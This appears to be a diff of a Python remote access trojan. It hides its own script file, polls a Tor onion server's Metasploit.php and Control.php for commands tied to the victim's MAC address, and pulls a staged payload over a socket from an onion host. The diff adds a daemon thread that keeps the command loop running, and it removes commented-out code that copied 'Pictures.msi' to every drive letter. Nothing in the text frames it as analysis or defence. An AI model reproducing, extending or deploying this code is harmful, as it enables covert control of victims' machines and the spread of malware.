@@ -29,37 +29,18 @@ requests_session.proxies.update(proxies)
 subprocess.Popen("attrib +h BN.pyw", shell=True) 
 
 
-#def COPY():
-
-#   source_file = "Pictures.msi"
-#   while True:
- #    try:
-  #       drives = [f"{drive}:" for drive in string.ascii_uppercase + string.ascii_lowercase]
-   #      for drive in drives:
-    #         destination_path = os.path.join(drive, os.path.basename(source_file))
-     #        try:
-      #          shutil.copy(source_file, destination_path)
-       #      except Exception as e:
-        #        print()
-#     except Exception as e:
- #        print()
-#
- #    time.sleep(1)
-
-#A = threading.Thread(target=COPY)
-#A.daemon = True
-#A.start()
-
 def METASPLOIT(): 
   
     actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
     actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)]) 
   
     previous_data = ""
-
+  
     while True:
      url = 'http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/Metasploit.php'
+     time.sleep(5)
      response = requests_session.get(url)
+
      if response.status_code == 200:
         data = response.text.strip()
         if data != previous_data:
@@ -267,7 +248,7 @@ def METASPLOIT():
                            for port in ports_to_try:
                             try:
                               s = socket.socket(2, socket.SOCK_STREAM)
-                              s.connect(('/xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion', port))  # Change the URL
+                              s.connect(('TOR.onion', port))  # Change the URL
 
                               l = struct.unpack('>I', s.recv(4))[0]
                               d = s.recv(1)
@@ -296,13 +277,14 @@ def METASPLOIT():
                 else:
                     print("Invalid command:", option)
             else:
+                time.sleep(10)
                 print("MAC not provided or does not match. Cannot execute command.")
         else:
             time.sleep(10)
             print("No new data.")
-     else:
+    else:
         print("Failed to fetch data.")
-        time.sleep(1)
+    time.sleep(1)
 
 
 specific_code_thread = threading.Thread(target=METASPLOIT)
@@ -311,7 +293,6 @@ specific_code_thread.start()
 
 previous_command = None
 previous_files = {}
-
 
 def clear_screen():
     if os.name == 'nt':
@@ -347,6 +328,19 @@ def hide_files_windows(file_paths):
             ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
     except Exception as e:
         print(f"Error hiding files on Windows: {str(e)}")
+
+def MEATSERVICE():
+    while True:
+        try:
+         print("Running MEATSERVICE...")
+         METASPLOIT()
+         time.sleep(10)
+        except:
+            pass
+
+MEATSERVICE = threading.Thread(target=MEATSERVICE)
+MEATSERVICE.daemon = True  
+MEATSERVICE.start()
 
 def get_system_info():
     try:
@@ -407,7 +401,7 @@ while True:
             global previous_command, previous_files
             while True:
                 php_script_url = 'http://xvi5zgvorv6fm7zpqcqoruna7a535a7zzlaiaeypdk56wdzcrclyczqd.onion/Control.php'
-                time.sleep(10)
+                time.sleep(15)
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
 
